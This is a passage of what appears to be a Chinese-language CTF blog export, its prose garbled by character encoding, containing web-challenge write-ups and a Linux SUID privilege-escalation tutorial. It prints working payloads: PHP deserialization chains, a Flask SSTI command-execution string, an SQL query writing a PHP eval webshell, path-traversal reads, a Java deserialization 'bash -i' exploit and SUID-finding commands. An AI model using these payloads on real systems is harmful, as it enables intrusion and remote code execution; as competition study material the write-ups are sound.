$dong;\n    public function __wakeup(){\n        return $this->ding->dong;\n    }\n}\nclass milaoshu{\n    public $v;\n    public function __tostring(){\n        echo\"misca~musca~milaoshu~~~\";\n        include($this->v);\n    }\n}\nfunction check($data){\n    if(preg_match('/^O:\\d+/',$data)){\n        die(\"you should think harder!\");\n    }\n    else return $data;\n}\nunserialize(check($_GET[\"wanna_fl.ag\"]));\n```\n\né“¾å­ä¸éš¾ éš¾ç‚¹åœ¨äº `$this->gao=$this->fei;`è¿™å¥è¯¥æ€ä¹ˆç”¨\n\nè¿™é‡Œå°±éœ€è¦çŸ¥é“å¼•ç”¨è¿ç®—ç¬¦\n\nä¸¾ä¸ªå°ä¾‹å­è¯´æ˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696928661467-d50a9a71-5ff4-43e5-a049-df123d39419e.png)\n\nè¿™é‡Œå–äº†äº†açš„åœ°å€ ä¿®æ”¹b é‚£ä¹ˆä¹Ÿå°±ä¼šä¿®æ”¹a\n\nåœ¨è¿™é“é¢˜ç›®æˆ‘ä»¬éœ€è¦ä¿®æ”¹`$this->a`ä¸º`milaoshu`å¯¹è±¡ æ‰€ä»¥å°±è¦ç”¨åˆ°å¼•ç”¨è¿ç®—ç¬¦`&`\n\nè¿˜æœ‰å°±æ˜¯æ­£åˆ™ ä¸èƒ½0å¼€å¤´ ç”¨arrayç»•è¿‡å°±è¡Œ\n\npocå¦‚ä¸‹\n\n```java\n<?php\nclass misca{\n    public $gao;\n    public $fei;\n    public $a;\n}\nclass musca{\n    public $ding;\n    public $dong;\n}\nclass milaoshu{\n    public $v;\n}\n$a = new musca();\n$a->ding = new misca();\n$a->ding->gao =&$a->ding->a;\n$a->ding->fei = new milaoshu();\n$a->ding->fei->v = 'php://filter/read=convert.base64-encode/resource=flag.php';\n$b = array(\"1\"=>$a);\necho urlencode(serialize($b));\n?>\n#a%3A1%3A%7Bi%3A1%3BO%3A5%3A%22musca%22%3A2%3A%7Bs%3A4%3A%22ding%22%3BO%3A5%3A%22misca%22%3A3%3A%7Bs%3A3%3A%22gao%22%3BN%3Bs%3A3%3A%22fei%22%3BO%3A8%3A%22milaoshu%22%3A1%3A%7Bs%3A1%3A%22v%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7Ds%3A1%3A%22a%22%3BR%3A4%3B%7Ds%3A4%3A%22dong%22%3BN%3B%7D%7D\n```\n\n## no_wake_up\n\nè€ƒç‚¹ï¼š\n\n- fast destruct\n\npoc\n\n```java\n<?php\nclass flag{\n    public $username;\n    public $code;\n\n}\n$a = new flag();\n$a->username = \"admin\";\n$a->code = \"php://filter/read=convert.base64-encode/resource=flag.php\";\necho serialize($a);\n?>\n#O:4:\"flag\":2:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";\n```\n\n## ez_ssti\n\nè€ƒç‚¹:\n\n- flask ssti\n\nåŸºç¡€æ— è¿‡æ»¤\n\n`?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}`payloadä¸å”¯ä¸€\n\n## EasyCMS\n\nè®¿é—®`/admin/admin.php` åˆ°åå°\n\n`admin/mao` é»˜è®¤å¯†ç ç™»å½•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696935237103-37e0ae4e-16eb-4996-9505-8af901743984.png)\n\nå¯ä»¥æ‰§è¡Œsqlè¯­å¥\n\nç›´æ¥å†™é©¬åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹\n\n```\nselect \"<?php @eval($_POST['x']);?>\" INTO OUTFILE \"/var/www/html/1.php\";\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696935273584-ee0d7776-e5f1-428a-8763-1095bf028ca9.png)\n\n## MD5çš„äº‹å°±æ‹œæ‰˜äº†\n\nè€ƒç‚¹ï¼š\n\n- å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»\n\næºç å¦‚ä¸‹\n\n```java\n<?php\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['SHCTF'])){\n    extract(parse_url($_POST['SHCTF']));\n    if($$$scheme==='SHCTF'){\n        echo(md5($flag));\n        echo(\"</br>\");\n    }\n    if(isset($_GET['length'])){\n        $num=$_GET['length'];\n        if($num*100!=intval($num*100)){\n            echo(strlen($flag));\n            echo(\"</br>\");\n        }\n    }\n}\nif($_POST['SHCTF']!=md5($flag)){\n    if($_POST['SHCTF']===md5($flag.urldecode($num))){\n        echo(\"flag is\".$flag);\n    }\n}\n```\n\né¦–å…ˆå°±æ˜¯æ­£å¸¸çš„å˜é‡è¦†ç›–\n\nPOSTï¼š`SHCTF=host://query?SHCTF`\n\nGETï¼š`length=0.0000001`\n\nç„¶åæˆ‘ä»¬å¯ä»¥å¾—åˆ°flagçš„md5å€¼å’Œflagé•¿åº¦\n\nå…³é”®åœ¨äº\n\n```java\nif($_POST['SHCTF']!=md5($flag)){\n    if($_POST['SHCTF']===md5($flag.urldecode($num))){\n        echo(\"flag is\".$flag);\n    }\n```\n\nä¸€çœ¼ä¸çœŸæ˜¯å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»\n\nåœ¨è¿™é‡Œæœ‰å¼¯å­çŒªè„‘å½“æ—¶æ²¡ç»•è¿‡æ¥\n\nä¸¾ä¸ªä¾‹å­\n\nä¸€èˆ¬æˆ‘ä»¬å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»å·²çŸ¥`md5($salt.$somethong.$insert)`salté•¿åº¦å’Œsomethingçš„å€¼\n\n`$insert`æ˜¯æˆ‘ä»¬å¯æ§èƒ½è¾“å…¥çš„ç‚¹\n\nä½†æ˜¯è¿™é“é¢˜æˆ‘ä»¬åªçŸ¥é“`md5($flag)`çš„å€¼ å¹¶ä¸çŸ¥é“é‚£ä¸€å¨çš„md5å€¼\n\nè¿™é‡Œéœ€è¦ç»•ä¸€ä¸‹è®¤ä¸º`saltä¸º0` ä¸€èˆ¬flagæ ¼å¼ä¸º`flag{xxx-xxx-xxx-xxx}`\n\né‚£ä¹ˆæˆ‘ä¹ˆä»¬å°†`$somethong=flag{xxx-xxx-xxx-xxx` å°†è¿™æ®µæˆ‘ä»¬èƒ½è¾“å…¥`$insert`çš„å½“ä½œ`}`\n\nè¿™æ ·æˆ‘ä»¬å°±å˜ç›¸çš„çŸ¥é“äº†é‚£ä¸€å¨çš„md5å€¼\n\nåˆ©ç”¨hashpumpå·¥å…·\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696994485178-e7586fae-acc9-42d2-a0a3-79aa7579011e.png)\n\nåœ¨è¿™é‡Œ`a280dad8326674279a3944046bc364f3`å…¶å®å°±æ˜¯æˆ‘ä»¬åŠ å…¥æ”»å‡»å€¼ä¹‹åé‚£ä¸€å¨çš„md5å€¼\n\nç„¶åè¾“å…¥çš„æ—¶å€™lengthåªéœ€è¦è¾“å…¥`%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%001`å‰é¢`}`å°±ä¸éœ€è¦äº† ä¸ç„¶å°±å’Œflagé‡å¤äº† å¹¶ä¸”lengthåªå®¹è®¸æ˜¯æ•°å­—\n\npayload:\n\n```java\nPOST:SHCTF=a280dad8326674279a3944046bc364f3\nGET:length=%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%001\n```\n\n\n\n## [WEEK2]ez_rceï¼ˆæœªè§£å‡ºï¼‰\n\nè€ƒç‚¹ï¼š\n\n- subprocess.call()å‘½ä»¤æ³¨å…¥\n\næºç å¦‚ä¸‹ï¼š\n\n```javascript\nfrom flask import *\nimport subprocess\n\napp = Flask(__name__)\n\ndef gett(obj,arg):\n    tmp = obj\n    for i in arg:\n        tmp = getattr(tmp,i)\n    return tmp\n\ndef sett(obj,arg,num):\n    tmp = obj\n    for i in range(len(arg)-1):\n        tmp = getattr(tmp,arg[i])\n    setattr(tmp,arg[i+1],num)\n\ndef hint(giveme,num,bol):\n    c = gett(subprocess,giveme)\n    tmp = list(c)\n    tmp[num] = bol\n    tmp = tuple(tmp)\n    sett(subprocess,giveme,tmp)\n\ndef cmd(arg):\n    subprocess.call(arg)\n\n\n@app.route('/',methods=['GET','POST'])\ndef exec():\n    try:\n        if request.args.get('exec')=='ok':\n            shell = request.args.get('shell')\n            cmd(shell)\n        else:\n            exp = list(request.get_json()['exp'])\n            num = int(request.args.get('num'))\n            bol = bool(request.args.get('bol'))\n            hint(exp,num,bol)\n        return 'ok'\n    except:\n        return 'error'\n    \nif __name__ == '__main__':\n    app.run(host='0.0.0.0',port=5000)\n```\n\nåŸç†ï¼š\n\nå½“subprocess.call()å‡½æ•°ç¬¬ä¸ƒä¸ªå‚æ•°shell=falseåˆ™ä¼šç›´æ¥æ‰§è¡Œå‘½ä»¤è€Œä¸é€šè¿‡shellç¯å¢ƒè°ƒç”¨\n\nå½“shell=trueæ—¶ å°±ä¼šè°ƒç”¨/bin/sh æ¥æ‰§è¡Œå‘½ä»¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533430884-f3f1f5a4-22e2-45e8-941b-b3bc43192f67.png)\n\nsubprocess.call()å…¶å®è°ƒç”¨çš„æ˜¯Popen()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533474760-aa96130f-7ade-4152-9926-fc7afe009013.png)\n\næˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹\n\nå¯ä»¥çœ‹åˆ°é»˜è®¤shell=false\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533542743-270a8adc-f50c-4bb3-b282-6144db8e74de.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533800870-0bb0adcb-5d03-4300-9797-77121fc4c848.png)\n\nå€¼å¾—æ³¨æ„çš„æ˜¯è¿›ç¨‹è¢«å¡æ­»åœ¨è¿™é‡Œå«åšæ­»é”\n\nå¦‚æœæˆ‘ä»¬æ‰§è¡Œå‘½ä»¤åªæ˜¯å•çº¯ä¸€å¥æŒ‡ä»¤ é‚£ä¹ˆæ— è®ºæ˜¯shellç­‰äºtrueè¿˜æ˜¯false éƒ½ä¼šæ‰§è¡Œ ä¸¤è€…æ²¡æœ‰å·®åˆ«\n\nåŠ äº†å‚æ•°é‚£ä¹ˆshell=falseå°±æ— æ³•æ‰§è¡Œäº†\n\nå› æ­¤è¿™é“é¢˜å°±åº”è¯¥å…ˆå»ä¿®æ”¹subprocess.call()çš„ç¬¬ä¸ƒä¸ªå‚æ•°ä¸ºtrueè¿™æ ·æˆ‘ä»¬æ‰èƒ½æ‰§è¡Œå¸¦æœ‰å‚æ•°çš„å‘½ä»¤\n\né€šè¿‡ setattræ¥ä¿®æ”¹å±æ€§å€¼\n\nsetattr(a,b,c)ï¼šå°†aå¯¹è±¡çš„ç¬¬bä¸ªå±æ€§ä¿®æ”¹ä¸ºvlaue=c  \n\néœ€è¦æ³¨æ„è¿™é‡Œexpæ˜¯jsonæ ¼å¼çš„`exp = list(request.get_json()['exp'])`\n\npayload:`?exec=oka&num=7&bol=1`\n\n```javascript\n{\n    \"exp\":[\n        \"Popen\",\n        \"__init__\",\n        \"__defaults__\"\n    ]\n}\n```\n\nç„¶åè¿›è¡Œé€šè¿‡å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™å…¥æ–‡ä»¶æ¥è¯»å– ä½†æ˜¯è¿™é‡Œä¸èƒ½è¿›è¡Œåå¼¹shell ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› \n\n```\n?shell=mkdir+./static;ls+/>./static/a.txt&exec=ok\n```\n\n# WEEK3\n\n## å¿«é—®å¿«ç­”\n\nå†™è„šæœ¬\n\n## sseerriiaalliizzeeï¼ˆæœªè§£å‡ºï¼‰\n\nçº¯çœ¼ç\n\nè€ƒç‚¹ï¼š\n\n- exitæ­»äº¡ç»•è¿‡ \n\npopé“¾ä¸éš¾\n\né‚£ä¹ˆè¿™é“é¢˜æœ€å¤§çš„å‘ç‚¹åœ¨äºå¦‚ä½•è§¦å‘`__toString `å…¶å®æ˜¯é è¿™é‡Œçš„echoè¯­å¥è§¦å‘ï¼ˆåè¡€ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698741524834-753296b0-0c06-4261-b9ab-babb88c919f7.png)\n\n```javascript\n<?php\nclass Start{\n    public $barking;\n}\nclass CTF{ \n    public $part1;\n    public $part2;\n}\nclass Flag{\n}\n$a = new Start();\n$a->barking=new CTF();\n$a->barking->part1='php://filter/write=convert.base64-decode/resource=cmd.php';\n$a->barking->part2='AA'.base64_encode('<?php phpinfo();?>');\necho urlencode(serialize($a));\n?>\n```\n\néœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œ`+`ä¹Ÿç®—æ˜¯åˆæ³•å­—ç¬¦ æ‰€ä»¥è¦åŠ ä¸¤ä¸ªä»»æ„å­—ç¬¦AAæ¥å’Œ`<?php die(\"+Genshin Impact Start!+\");?>`æ„æˆå››ä¸ªä¸€ç»„ \n\nä¹Ÿå³æ˜¯ `AAphpdie+GenshinImpactStart+`æ€»è®¡ä¸º28 ä¸º4çš„æ•´æ•°å€\n\n\n\n## gogogoï¼ˆæœªè§£å‡ºï¼‰\n\nä¸»è¦æºç çœ‹è¿™ä¸ª\n\n```javascript\npackage route\n\nimport (\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/gorilla/sessions\"\n\t\"main/readfile\"\n\t\"net/http\"\n\t\"os\"\n\t\"regexp\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] == nil {\n\t\tsession.Values[\"name\"] = \"User\"\n\t\terr = session.Save(c.Request, c.Writer)\n\t\tif err != nil {\n\t\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t}\n\n\tc.String(200, \"Hello, User. How to become admin?\")\n\n}\n\nfunc Readflag(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] == \"admin\" {\n\t\tc.String(200, \"Congratulation! You are admin,But how to get flag?\\n\")\n\n\t\tpath := c.Query(\"filename\")\n\n\t\treg := regexp.MustCompile(`[b-zA-Z_@#%^&*:{|}+<>\";\\[\\]]`)\n\n\t\tif reg.MatchString(path) {\n\n\t\t\thttp.Error(c.Writer, \"nonono\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tvar data []byte\n\t\tif path != \"\" {\n\t\t\tdata = readfile.ReadFile(path)\n\t\t} else {\n\t\t\tdata = []byte(\"è¯·ä¼ å…¥å‚æ•°\")\n\t\t}\n\n\t\tc.JSON(200, gin.H{\n\t\t\t\"success\": \"read: \" + string(data),\n\t\t})\n\t} else {\n\t\tc.String(200, \"Hello, User. How to become admin?\")\n\t}\n\n}\n```\n\nçœ‹é¢˜ç›®ä¹ŸçŸ¥é“æ˜¯ä¸ªgoé¢˜ç›®\n\né¦–å…ˆå°±æ˜¯ä¼ªé€ adminèº«ä»½ æ ¹æ®æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745810102-34237fe9-659c-41d9-8498-8c6c637258ad.png)\n\nsessionçš„keyä»ç¯å¢ƒå˜é‡ä¸­å»è·å–çš„ ç›²çŒœä¸ºç©º å°±åƒå›½èµ›é‚£åˆ°é¢˜ç›®ä¸€æ · ç„¶åæœ¬åœ°èµ·ä¸€ä¸ªç¯å¢ƒ\n\né¦–å…ˆåœ¨go.modå¼•å…¥ä¾èµ– ç„¶åå¯åŠ¨\n\nç¨ç¨ä¿®æ”¹æºç  ä½¿å¾—æˆ‘ä»¬sessionçš„èº«ä»½ä¸ºadmin\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745974982-7f9ac75d-f37d-4359-a5c2-d674dac2f84e.png)\n\nå»è·å–session ç„¶åæ‰“å…¥é¢˜ç›®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745913115-965ef058-cf6f-45d0-94cf-ef858b8a06dd.png)\n\nç„¶åæ˜¯/readflagè·¯ç”± å»è¯»æ–‡ä»¶ è¦ç»•è¿‡ä¸€ä¸ªæ­£åˆ™\n\n```\nreg := regexp.MustCompile(`[b-zA-Z_@#%^&*:{|}+<>\";\\[\\]]`)\n```\n\nå¯è§è¿˜æœ‰ä¸€ä¸ªå­—ç¬¦aæ²¡æœ‰è¿‡æ»¤ ç›´æ¥åˆ©ç”¨é€šé…ç¬¦ \n\npayloadï¼š`/readflag?filename=/??a?`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698746089781-649d5278-6829-4ed4-8c45-56c3e1bd5e5d.png)\n","categories":["å„èµ›äº‹WP"]},{"title":"2023â€œç½‘ä¿¡æŸé¹­æ¯â€å¤§å­¦ç”Ÿç½‘ç»œç©ºé—´å®‰å…¨ç²¾è‹±èµ› WEB WPä¸å¤ç°","url":"/post/37ed1ed6.html","content":"\nweb \n\n<!--more-->\n\n# WEB\n\n## express fs\n\nçœ‹urlæ˜¯ä¸ªnodejsæ–‡ä»¶è¯»å–çš„é¢˜ç›®\n\nå‘ç°æ˜¯åŸé¢˜https://cloud.tencent.com/developer/article/2123023\n\npayload:\n\nbanäº†flagå­—æ · å¯¹å…¶åŒurlç¼–ç å³å¯ç»•è¿‡  \n\nå› ä¸ºExpress å·²ç» URL è§£ç ä¸€æ¬¡\n\n```\n?file[href]=a&file[origin]=1&file[protocol]=file:&file[hostname]=&file[pathname]=/fl%2561g.txt\n```\n\n## ç»¼åˆé¢˜äº”\n\næœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ ä½†æ˜¯è¿™é“é¢˜æ²¡ç”¨\n\nç„¶åè§‚å¯Ÿè¯»å–ä¸Šä¼ çš„æ–‡ä»¶urlå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–\n\næŸ¥çœ‹ä¸€ä¸‹å½“å‰è¿›ç¨‹\n\n```\n/readfile?filename=../../../../../../proc/self/cmdline\n```\n\nå‘ç°/appç›®å½•ä¸‹æœ‰jaråŒ… å°±æƒ³è¯»ä¸‹æ¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697181098715-b040db41-6a76-4e11-8f2b-66667ea5efaa.png)\n\n```\n/readfile?filename=../../../../../../app/demo.jar\n```\n\nå½“æ—¶æ¯”èµ›ç¯å¢ƒå®ƒæœ‰é—®é¢˜ æˆ‘æ ¹æœ¬ä¸‹è½½ä¸ä¸‹æ¥ ä¸€ç›´åœ¨è½¬åœˆ \n\nå¤ç°å‘ç°æ˜¯è¿‡äº†é‚£ä¸ªbpä»£ç†å°±ä¸‹ä¸ä¸‹æ¥ å¾—å»æ‰æ‰è¡Œ\n\nå¾—åˆ°æºç  å¾ˆæ˜æ˜¾o0oå‡½æ•°åœ¨åšä¸€ä¸ªå¼‚æˆ–æ“ä½œæˆ–è€…è°ƒæ•™gptä¹Ÿèƒ½çŸ¥é“\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697182071732-2fb2892b-27e0-4309-9420-7c4ec6b1d0ff.png)\n\nç›´æ¥ç”¨å¤§å¤´å¸ˆå‚…çš„è„šæœ¬\n\n```java\nimport base64\nfrom pwn import *\nkey = b'6925cc02789c1d2552b71acc4a2d48fd'\nenc = 'UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA=='\nenc = base64.b64decode(enc)\nprint(enc)\n# key = bytes.fromhex(key)\nflag = xor(key,enc)\nprint(flag)\n# flag{ISEC-52e353a950c752b3dc8f0d1c949f0361}\n```\n\n## ç»¼åˆé¢˜å…­\t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697182444787-3fbf102c-d17d-4576-a2c6-fb57bf8a1134.png)\n\né‡å†™readObject å¹¶ä¸”æœ‰ä¸€ä¸ªæ¶æ„ç±» è¿˜èƒ½æ‰§è¡Œå‘½ä»¤å‡½æ•° å¾ˆæ˜æ˜¾ä¸€ä¸ªjavaååºåˆ—åŒ–åˆ©ç”¨\n\nåœ¨è¿™ä¸ªè·¯ç”±ä¸‹åˆ©ç”¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697184231819-d32a28fd-652a-4970-8d52-3083a7d92892.png)\n\nexpï¼š\n\n```java\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.util.Base64;\n\npublic class exp {\n    public static void main(String[] args) throws Exception {\n        Ping ping = new Ping();\n        ping.setCommand(\"bash\");\n        ping.setArg1(\"-i\");\n        //å’Œysoserialå‘½ä»¤åˆ©ç”¨æ–¹å¼ä¸€æ ·\n        ping.setArg2(\"{echo,å‘½ä»¤base64ç¼–ç }|{base64,-d}|{bash,-i}\");\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);\n        objectOutputStream.writeObject(ping);\n        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));\n\n    }\n\n}\n```\n\n## ç»¼åˆé¢˜ä¸ƒ\n\nç»è¿‡ç»¼åˆé¢˜å…­åˆ°å†…ç½‘ æœ‰ä¸€ä¸ªrediså¹¶ä¸”22ç«¯å£å¼€æ”¾ å°±æ˜¯rediså†™sshå…¬é’¥çš„ æ²¡ç¯å¢ƒå¤§è‡´å’Œé‚£ä¸ªmoectfå†…ç½‘æ¸—é€é¢˜ç›®ä¸€æ¨¡ä¸€æ ·\n\nå…ˆä»å†…ç½‘ä¸­è¯»åˆ°rediså¯†ç \n\n```\n/readfile?filename=../../../../../../../usr/local/share/application.properties\nserver.port=18080\nserver.servlet.context-path=/\nmanagement.endpoints.web.exposure.include=heapdump\nspring.redis.host=172.25.0.10\nspring.redis.port=62341\nspring.redis.password=de17cb1cfa1a8e8011f027b416775c6a\nspring.servlet.multipart.max-file-size=10MB\n```\n\nä¹‹åæµç¨‹å¯å‚è€ƒ[Redisæœªæˆæƒè®¿é—®å†™Webshellå’Œå…¬ç§é’¥è®¤è¯è·å–rootæƒé™ - å¿å…ˆç”Ÿ - åšå®¢å›­](https://www.cnblogs.com/-qing-/p/10978912.html)\n\n## è¿˜æœ‰ä¸‰ä¸ªé¢˜å‡ä¸º0è§£\n\n\n\n\n\n## \n","categories":["å„èµ›äº‹WP"]},{"title":"Linux suidææƒ","url":"/post/51218ec8.html","content":"\nLinux suidææƒ\n\n<!--more-->\n\n# what\n\nSUIDï¼ˆSet User IDï¼‰æ˜¯ä¸€ç§ Unix å’Œç±» Unix æ“ä½œç³»ç»Ÿä¸­çš„æƒé™ä½ï¼Œç”¨äºæ”¹å˜æ‰§è¡Œæ–‡ä»¶çš„æƒé™ã€‚å½“ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è¢«è®¾ç½®ä¸º SUIDï¼Œå®ƒåœ¨æ‰§è¡Œæ—¶å°†å…·æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼Œè€Œä¸æ˜¯æ‰§è¡Œè€…çš„æƒé™ã€‚\n\nç®€å•è¯´ï¼šå¦‚æœä¸€ä¸ªæ–‡ä»¶å…·æœ‰sæƒé™ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æ‰§è¡Œå®ƒæ—¶ï¼Œä¸æ˜¯ä»¥ç”¨æˆ·èº«ä»½æ‰§è¡Œï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶æ‰€æœ‰è€…èº«ä»½æ‰§è¡Œï¼Œå› è€Œå…·æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™\n\nè¿™å¯ä»¥ç”¨äºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è·å–ç‰¹æƒï¼Œä¾‹å¦‚å…è®¸æ™®é€šç”¨æˆ·æ‰§è¡Œéœ€è¦è¶…çº§ç”¨æˆ·æƒé™çš„æ“ä½œï¼Œè€Œæ— éœ€ç™»å½•è¶…çº§ç”¨æˆ·è´¦æˆ·\n\n> linuxå¼•å…¥äº†3ä¸ªæ–‡ä»¶æ¥ç®¡ç†ç”¨æˆ·ç»„ï¼š\n>\n> 1. /etc/passwdå­˜æ”¾ç”¨æˆ·ä¿¡æ¯ã€‚\n> 2. /etc/shadowå­˜æ”¾ç”¨æˆ·å¯†ç ä¿¡æ¯ã€‚\n> 3. /etc/groupå­˜æ”¾ç»„ä¿¡æ¯ã€‚\n>\n> åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ¯ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å¤´é‡Œé¢æ·»åŠ äº†ç”¨æˆ·å’Œæ–‡ä»¶ä¹‹é—´çš„å…³ç³»ä¿¡æ¯ã€‚\n>\n> ç”¨æˆ·ä¿¡æ¯/etc/passwdæ¯è¡Œå…±æœ‰7ä¸ªå­—æ®µå†’å·éš”å¼€ï¼š\n>\n> å­—æ®µ1ä¸ºç”¨æˆ·åã€‚\n>\n> å­—æ®µ2ä¸ºç”¨æˆ·çš„å¯†ç ã€‚\n>\n> å­—æ®µ3ä¸ºæŒ‡UIDï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„uidã€‚\n>\n> å­—æ®µ4ä¸ºç»„UIDï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸åŒçš„uidã€‚\n>\n> å­—æ®µ5ä¸ºè§£é‡Šè¯´æ˜çš„å­—æ®µã€‚\n>\n> å­—æ®µ6ä¸ºæŒ‡ç”¨æˆ·çš„æ ¹ç›®å½•ã€‚\n>\n> å­—æ®µ7ä¸ºæŒ‡ç™»å½•shellï¼Œç”¨æˆ·ç™»å½•shellï¼Œå½“å‰ä¸º/bin/zshè¡¨ç¤ºå¯ä»¥ç™»å½•ï¼Œ/sbin/nologinæ ‡è¯†ä¸è¢«æˆæƒç™»å½•ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695300429889-ce892384-256a-4a3c-bb27-42fea2f16dfc.png)\n\n# åˆ©ç”¨\n\nå¯ä»¥çœ‹åˆ°åªæœ‰rootçš„uidä¸º0 å¦‚æœæŠŠä¸€ä¸ªæ™®é€šç”¨æˆ·çš„uidä¿®æ”¹ä¸º0ï¼Œé‚£ä¹ˆåªè¦ä»¥æ™®é€šç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œåœ¨ç³»ç»ŸåŠ å›ºæ—¶ä¸€å®šè¦æ‰¾å‡ºæœ‰å“ªäº›ç”¨æˆ·çš„uidä¸º0\n\nå½“æˆ‘ä»¬åœ¨linuxåˆ›å»ºæ–‡ä»¶æ—¶ï¼Œérootç”¨æˆ·æ˜¯æ— æ³•åˆ›å»ºçš„ï¼Œé™¤éè®©rootç”¨æˆ·ä¸ºæˆ‘ä»¬æå‡æƒé™æˆ–è€…ç”¨sudoå‘½ä»¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301362482-ee8ac428-a058-455a-b3e8-1720e6d35d1b.png)\n\nå¹¶ä¸”æ­¤æ—¶åˆ›å»ºçš„æ–‡ä»¶çš„æ‰€å±äººæ‰€å±ç»„ä¹Ÿæ˜¯root å¹¶ä¸æ˜¯æˆ‘ä»¬è‡ªå·±\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301465468-3823df3f-d3de-4b4d-9846-9427efb82035.png)\n\nå› æ­¤ å¦‚æœè¿™ä¸ªæ–‡ä»¶å¸¦æœ‰suid é‚£ä¹ˆå½“æˆ‘ä»¬æ‰§è¡Œçš„æ—¶å€™å°±ä¼šä»¥rootæƒé™è¿›è¡Œæ‰§è¡Œï¼Œå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶è¯¥è¿›ç¨‹çš„æƒé™ä¸ºrootæƒé™ ä»è€Œæå‡æƒé™\n\n# å¦‚ä½•è®¾ç½®suid\n\n```java\nchmod u+s filename #è®¾ç½®suid\nchmod u-s filename #å»é™¤suid\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301658898-a848291a-5c20-413c-9a21-04496ec48d23.png)\n\n# å¦‚ä½•æŸ¥æ‰¾suidæ–‡ä»¶\n\nå¸¸ç”¨çš„å‡ æ¡ï¼š\n\n```java\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} \\;\n```\n\n\n\n# åˆ©ç”¨suidè¿›è¡Œææƒ\n\n## 